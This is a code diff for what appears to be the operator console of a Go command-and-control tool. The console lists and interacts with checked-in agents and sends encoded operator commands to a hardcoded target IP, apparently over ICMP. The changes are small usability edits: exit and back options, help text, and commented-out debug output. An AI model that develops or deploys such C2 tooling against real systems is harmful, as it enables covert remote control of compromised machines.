@@ -7,7 +7,6 @@
 package main
 
 import (
-	"bufio"
 	// Base Libs
 	"encoding/base64"
 	"encoding/hex"
@@ -16,6 +15,7 @@ import (
 	"net"
 	"os"
 	"strings"
+	"bufio"
 
 	// External Libs
 	"github.com/AlecAivazis/survey/v2"
@@ -33,7 +33,7 @@ import (
 
 // targetIP is the const variable of the IP to send data to
 // TODO: Change to whatever agent you are interacting with
-const targetIP = "10.10.100.155"
+const targetIP = "192.168.230.132"
 
 // To be used as an egg later
 //const secretMessage = "Activate"
@@ -201,10 +201,15 @@ func SendData(data string, seq int) {
 		},
 	}
 
-	fmt.Println(data)
-	fmt.Println([]byte(data))
+	// Debugging
+	//fmt.Println(data)
+	//fmt.Println([]byte(data))
+	
 	wb, err := wm.Marshal(nil)
-	fmt.Println(wb)
+	
+	// Debugging
+	//fmt.Println(wb)
+	
 	if err != nil {
 		log.Fatal().AnErr("Marshal Error", err)
 	}
@@ -216,11 +221,10 @@ func SendData(data string, seq int) {
 
 func main() {
 	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
-	//buf := make([]byte, 100000)
 
 	for {
 
-		options := []string{"Listen", "Help", "List", "Interact"}
+		options := []string{"Listen", "Help", "List", "Interact", "Exit"}
 		validate := func(input string) error {
 			found := validateOptions(options, input)
 
@@ -258,9 +262,11 @@ func main() {
 			fmt.Println("")
 			fmt.Println(color.HiYellowString("[ Valid Commands ]		[ Description ]"))
 			fmt.Println("------------------      	---------------") // Literally just aesthetic
-			fmt.Println(" ")
 			fmt.Println(" Help				Display this help menu")
 			fmt.Println(" List				List all the previously checked in agents")
+			fmt.Println(" Listen				Listen for new agent callbacks")
+			fmt.Println(" Interact			Without any args, pull up a menu of agents to interact with")
+			fmt.Println(" Exit				Quit")
 			fmt.Println(" ")
 
 		}
@@ -274,6 +280,10 @@ func main() {
 				fmt.Println(agents)
 			}
 
+		}
+
+		if strings.EqualFold(result, "Exit") {
+			os.Exit(0)
 		}
 
 		if strings.EqualFold(result, "Interact") {
@@ -300,6 +310,11 @@ func main() {
 				text, _ := reader.ReadString('\n')
 				text = strings.Replace(text, "\n", "", -1)
 				text = strings.Replace(text, "\r", "", -1)
+
+				// Check if operator typed "back" meaning to go back to the main menu
+				if text == "back" {
+					break
+				}
 
 				data := EncodeData(text)
 				SendData(data, 3)
